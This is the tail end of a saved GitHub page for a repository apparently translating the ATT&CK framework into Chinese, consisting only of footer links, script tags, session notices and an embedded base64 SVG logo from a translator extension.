        <li class="mr-3 mr-lg-0"><a href="https://github.com/pricing" data-ga-click="Footer, go to Pricing, text:Pricing">Pricing</a></li>
      <li class="mr-3 mr-lg-0"><a href="https://developer.github.com/" data-ga-click="Footer, go to api, text:api">API</a></li>
      <li class="mr-3 mr-lg-0"><a href="https://training.github.com/" data-ga-click="Footer, go to training, text:training">Training</a></li>
        <li class="mr-3 mr-lg-0"><a href="https://github.blog/" data-ga-click="Footer, go to blog, text:blog">Blog</a></li>
        <li><a data-ga-click="Footer, go to about, text:about" href="https://github.com/about">About</a></li>

    </ul>
  </div>
  <div class="d-flex flex-justify-center pb-6">
    <span class="f6 text-gray-light"></span>
  </div>
</div>



  <div id="ajax-error-message" class="ajax-error-message flash flash-error">
    <svg class="octicon octicon-alert" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg>
    <button type="button" class="flash-close js-ajax-error-dismiss" aria-label="Dismiss error">
      <svg class="octicon octicon-x" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.48 8l3.75 3.75-1.48 1.48L6 9.48l-3.75 3.75-1.48-1.48L4.52 8 .77 4.25l1.48-1.48L6 6.52l3.75-3.75 1.48 1.48L7.48 8z"></path></svg>
    </button>
    You can’t perform that action at this time.
  </div>


    
    <script crossorigin="anonymous" integrity="sha512-4ujXwtLSReHUHCH6dNqlfugDOH6Uh3/4DflbyepcH64SLnJYJy1kbASPYjTzQHB0OmxR1L1Escg8LeMsaOZ63g==" type="application/javascript" src="./ATT-CK-CN_ATT&amp;CK模型.md at master · lengjibo_ATT-CK-CN_files/frameworks-d5c43622.js.下载"></script>
    
    <script crossorigin="anonymous" async="async" integrity="sha512-p/bfQtV4SmULE3cgjjeKP8Pd8YUydmpPUVCyGzOGYqOTiXRq67HB16OECb0uoTSqrmBRySCXSJMeVWkSaYghIA==" type="application/javascript" src="./ATT-CK-CN_ATT&amp;CK模型.md at master · lengjibo_ATT-CK-CN_files/github-bootstrap-c9c5a12d.js.下载"></script>
    
    
    
  <div class="js-stale-session-flash stale-session-flash flash flash-warn flash-banner" hidden="">
    <svg class="octicon octicon-alert" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg>
    <span class="signed-in-tab-flash">You signed in with another tab or window. <a href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md">Reload</a> to refresh your session.</span>
    <span class="signed-out-tab-flash">You signed out in another tab or window. <a href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md">Reload</a> to refresh your session.</span>
  </div>
  <template id="site-details-dialog"></template>

  <div class="Popover js-hovercard-content position-absolute" style="display: none; outline: none;" tabindex="0">
  <div class="Popover-message Popover-message--bottom-left Popover-message--large Box box-shadow-large" style="width:360px;">
  </div>
</div>

  <div aria-live="polite" class="js-global-screen-reader-notice sr-only"></div>

  


<div class="__transltor"><img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMzU4cHgiIGhlaWdodD0iMzU2cHgiIHZpZXdCb3g9IjAgMCAzNTggMzU2IiB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPgogICAgPCEtLSBHZW5lcmF0b3I6IFNrZXRjaCA0OC4xICg0NzI1MCkgLSBodHRwOi8vd3d3LmJvaGVtaWFuY29kaW5nLmNvbS9za2V0Y2ggLS0+CiAgICA8dGl0bGU+TG9nby0yPC90aXRsZT4KICAgIDxkZXNjPkNyZWF0ZWQgd2l0aCBTa2V0Y2guPC9kZXNjPgogICAgPGRlZnM+CiAgICAgICAgPGNpcmNsZSBpZD0icGF0aC0xIiBjeD0iMTc5IiBjeT0iMTc5IiByPSIxNzkiPjwvY2lyY2xlPgogICAgPC9kZWZzPgogICAgPGcgaWQ9IlN5bWJvbHMiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgogICAgICAgIDxnIGlkPSJMb2dvLTIiPgogICAgICAgICAgICA8ZyBpZD0iR3JvdXAiPgogICAgICAgICAgICAgICAgPG1hc2sgaWQ9Im1hc2stMiIgZmlsbD0id2hpdGUiPgogICAgICAgICAgICAgICAgICAgIDx1c2UgeGxpbms6aHJlZj0iI3BhdGgtMSI+PC91c2U+CiAgICAgICAgICAgICAgICA8L21hc2s+CiAgICAgICAgICAgICAgICA8dXNlIGlkPSJPdmFsLTMiIGZpbGw9IiMxQTMwRDciIHhsaW5rOmhyZWY9IiNwYXRoLTEiPjwvdXNlPgogICAgICAgICAgICAgICAgPHBhdGggZD0iTTIwMi41MTI0NDksNDMwLjcyNzYzNiBDMTkxLjQyMjQ2NywzODEuNjM5MjM1IDIxOC4xMDE0MTEsMzA1LjE4NTE3OSAyMzQuODM1NjEzLDI5NC43Mzk5MDkgQzI2My4yOTU3ODMsMjkxLjgyMDc3MSAzMDguMjczOTY3LDI0NC43MjU1NTkgMzA4LjI3Mzk2NywxOTYuNDk2NjEgQzMwOC4yNzM5NjcsMTEzLjE5MjMyNCAyNjYuMTU1MjUxLDYzLjI3MDQyMTQgMjQwLjQzNDQ5Myw0Ni42MjY4OTgyIEMyMzAuNjc4OTcsNDAuMzE0MjQzIDIxOS43OTM5MTEsODMuMzAwMDc1MSAyMjIuNTgwNDc5LDEwMi42NDQ1ODkgQzE1Ni43Nzk4OTcsOTQuMTcxNDU0NyAxMjcuMDU3MzgzLDEzMC4zMDI1IDExNS45NjIyODgsMTM2LjYwMjI4NSBDMTEwLjE4OTYwNCwxMzIuMDM0MTI3IDY1LjE5NzMwOTgsODIuMTQ0NDQyNCA1MS40MTMwNjcxLDk0LjYwNDUwNDQgQzQzLjY1NDExMjYsMTI2LjA3NjM5OCA1OC42NDIyOCwyMjUuMTc4ODA3IDg3Ljc4NDg5MiwyNTEuMTA5MzUgQzc5LjA0NTE5NTMsMjgxLjEyNjY1OCAxMy4zNDgzMzQ1LDMxMy4zMTAwMDYgNiwzMTcuNjkzNDY0IiBpZD0iUGF0aC0xMSIgZmlsbD0iI0ZGRkZGRiIgbWFzaz0idXJsKCNtYXNrLTIpIj48L3BhdGg+CiAgICAgICAgICAgICAgICA8cGF0aCBkPSJNMjQzLjc1MDE5OSwxODAuMDkxNzgzIEMyNDguNTM1MTYsMTgwLjI0MjYxMyAyNTMuMDYzMjY2LDE3NS42NzA3IDI1My4wNjMyNjYsMTcwLjA3MjMxOSBDMjUzLjA2MzI2NiwxNjQuNDczOTM4IDI0OC42ODg2NSwxNTkuMjEzMzU5IDI0My4xNDIxNzEsMTU5LjA0MTk0MyBDMjM3LjU5NTY5MywxNTguODcwNTI3IDIzMy45NjM0NjIsMTY0Ljc5MDM5OSAyMzMuNzY5MzY3LDE2OS41MjQ2MDcgQzIzMy41NzUyNzEsMTc0LjI1ODgxNSAyMzguOTY1MjM4LDE3OS45NDA5NTIgMjQzLjc1MDE5OSwxODAuMDkxNzgzIFoiIGlkPSJPdmFsLTQiIGZpbGw9IiMxQTMwRDciIG1hc2s9InVybCgjbWFzay0yKSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMjQzLjQxMzc3MCwgMTY5LjU2Njg1Nykgcm90YXRlKC0yNC4wMDAwMDApIHRyYW5zbGF0ZSgtMjQzLjQxMzc3MCwgLTE2OS41NjY4NTcpICI+PC9wYXRoPgogICAgICAgICAgICAgICAgPHBhdGggZD0iTTE4OS41MzQxMzMsMjA4LjAzODExNyBDMTk1LjMzMzEyMywyMDguMDM4MTE3IDIwMC44ODI3MDgsMjAzLjkzNDk1OSAyMDAuODgyNzA4LDE5OC4xMzU5NjkgQzIwMC44ODI3MDgsMTkyLjMzNjk3OSAxOTQuODgxMTU2LDE4Ni43MDA0MTUgMTg5LjA4MjE2NiwxODYuNzAwNDE1IEMxODMuMjgzMTc2LDE4Ni43MDA0MTUgMTc4LjQ4NTk3OCwxOTEuNTQwNjg3IDE3OC40ODU5NzgsMTk3LjMzOTY3NyBDMTc4LjQ4NTk3OCwyMDMuMTM4NjY3IDE4My43MzUxNDQsMjA4LjAzODExNyAxODkuNTM0MTMzLDIwOC4wMzgxMTcgWiIgaWQ9Ik92YWwtNC1Db3B5IiBmaWxsPSIjMUEzMEQ3IiBtYXNrPSJ1cmwoI21hc2stMikiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDE4OS42ODQzNDMsIDE5Ny4zNjkyNjYpIHJvdGF0ZSgxMy4wMDAwMDApIHRyYW5zbGF0ZSgtMTg5LjY4NDM0MywgLTE5Ny4zNjkyNjYpICI+PC9wYXRoPgogICAgICAgICAgICAgICAgPHBhdGggZD0iTTIzOS4wNjMxNTUsMjE3LjM1NDI5NSBDMjQzLjY5OTE0LDIxMy44NTc0OTcgMjQ0LjU4NDk4NCwyMDYuNDMwMzExIDI0Mi43NjU4MDgsMjAzLjk2Nzc4IEMyMzcuODU5NTE4LDIwMS45MjYxOCAyMjcuODU5MDkzLDIwNC45NTAxNDIgMjI2LjA4ODA3NiwyMTMuNDQxNzM1IEMyMjguNTc5NDg4LDIxNi4zOTU3MjMgMjMyLjgyODY5LDIxNy4yODk0MDkgMjM5LjA2MzE1NSwyMTcuMzU0Mjk1IFoiIGlkPSJPdmFsLTQtQ29weS0yIiBmaWxsPSIjMUEzMEQ3IiBtYXNrPSJ1cmwoI21hc2stMikiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDIzNC44Njc1NzcsIDIxMC4zNTQwOTkpIHJvdGF0ZSgtMy4wMDAwMDApIHRyYW5zbGF0ZSgtMjM0Ljg2NzU3NywgLTIxMC4zNTQwOTkpICI+PC9wYXRoPgogICAgICAgICAgICAgICAgPHBhdGggZD0iTTIzOCwyMTQgTDI0MSwyMjEiIGlkPSJQYXRoLTMiIHN0cm9rZT0iIzFBMzBENyIgc3Ryb2tlLXdpZHRoPSI0IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIG1hc2s9InVybCgjbWFzay0yKSI+PC9wYXRoPgogICAgICAgICAgICAgICAgPGNpcmNsZSBpZD0iT3ZhbC0xMSIgZmlsbD0iIzFBMzBENyIgb3BhY2l0eT0iMC4xMDE1MDU4ODgiIG1hc2s9InVybCgjbWFzay0yKSIgY3g9IjI1OCIgY3k9IjE5MCIgcj0iNiI+PC9jaXJjbGU+CiAgICAgICAgICAgICAgICA8Y2lyY2xlIGlkPSJPdmFsLTExLUNvcHkiIGZpbGw9IiMxQTMwRDciIG9wYWNpdHk9IjAuMDc5OTM2NTk0MiIgbWFzaz0idXJsKCNtYXNrLTIpIiBjeD0iMjA4LjUiIGN5PSIyMjIuNSIgcj0iNi41Ij48L2NpcmNsZT4KICAgICAgICAgICAgICAgIDxwYXRoIGQ9Ik0zMDUsMjEwLjk3MTEwMiBMMzE3LjU3NjQ1MiwyMDkiIGlkPSJQYXRoLTE2IiBzdHJva2U9IiNGRkZGRkYiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBtYXNrPSJ1cmwoI21hc2stMikiPjwvcGF0aD4KICAgICAgICAgICAgICAgIDxwYXRoIGQ9Ik0zMDQsMjE0IEwzMTMuODgwNjI4LDIxNS41NjQ5MzgiIGlkPSJQYXRoLTE2LUNvcHkiIHN0cm9rZT0iI0ZGRkZGRiIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIG1hc2s9InVybCgjbWFzay0yKSI+PC9wYXRoPgogICAgICAgICAgICAgICAgPHBhdGggZD0iTTEzNy44NzMwNDgsMTI5LjcxODQyNSBMMTI0LDExMiIgaWQ9IlBhdGgtMTciIHN0cm9rZT0iI0ZGRkZGRiIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIG1hc2s9InVybCgjbWFzay0yKSI+PC9wYXRoPgogICAgICAgICAgICAgICAgPHBhdGggZD0iTTE0Mi41OTc4NzYsMTMyLjQ3MzA1MyBMMTMyLjcxMTg1NSwxMTIuMjU3NDQ5IiBpZD0iUGF0aC0xNy1Db3B5IiBzdHJva2U9IiNGRkZGRkYiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBtYXNrPSJ1cmwoI21hc2stMikiPjwvcGF0aD4KICAgICAgICAgICAgPC9nPgogICAgICAgIDwvZz4KICAgIDwvZz4KPC9zdmc+" class="__transltor_button" style="left: 566px; top: 35751px;"> <!----> <!----></div></body></html>